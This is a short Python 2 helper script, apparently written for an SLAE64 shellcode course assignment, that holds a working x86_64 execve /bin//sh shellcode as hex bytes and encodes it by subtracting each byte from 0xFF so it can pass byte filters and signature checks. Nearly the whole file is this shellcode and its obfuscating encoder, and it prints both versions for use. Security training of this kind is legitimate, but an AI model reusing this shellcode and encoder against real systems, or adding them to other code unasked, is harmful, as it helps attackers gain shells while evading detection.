#!/usr/bin/python

# Student ID  : SLAE64-1611
# Student Name: Jonathan "Chops" Crosby
# Assignment 4: Custom Encoder (Linux/x86_64) Python Helper


# clean shell code for our x86_64 execve exploit
cleanShellCode = ["48","31","c0","48","83","c0","3b","4d","31","c9","41","51","48","bb","2f","2f","62","69","6e","2f","73","68","53","48","89","e7","41","51","48","89","e2","57","48","89","e6","0f","05"]

#this will hold our final encoded shellcode
finalEncodedShellCode = []

#since we don't have any 0's or FF's in our original shellcode
#we can just subtract the hex from FF to generate a new code
for x in cleanShellCode:
        tmpInt = int("0x" + x, 0)
        newInt = 255 - tmpInt
        newHex = hex(newInt)
        finalEncodedShellCode.append(newHex[2:])

#add final value that will be searched for to terminate on
finalEncodedShellCode.append("ff")

tmpCleanShellCode = ""
for x in cleanShellCode:
        tmpCleanShellCode += "0x" + x + ","

print "Original Execve-Stack Shellcode: \n"
print tmpCleanShellCode[:-1] + "\n\n"
print "--------------------------------\n"

tmpFinalShellcode = ""
for x in finalEncodedShellCode:
        tmpFinalShellcode += "0x" + x + ","

print "Obfuscated Execve-Stack Shellcode: \n"
print tmpFinalShellcode[:-1] + "\n\n"
print "--------------------------------\n"
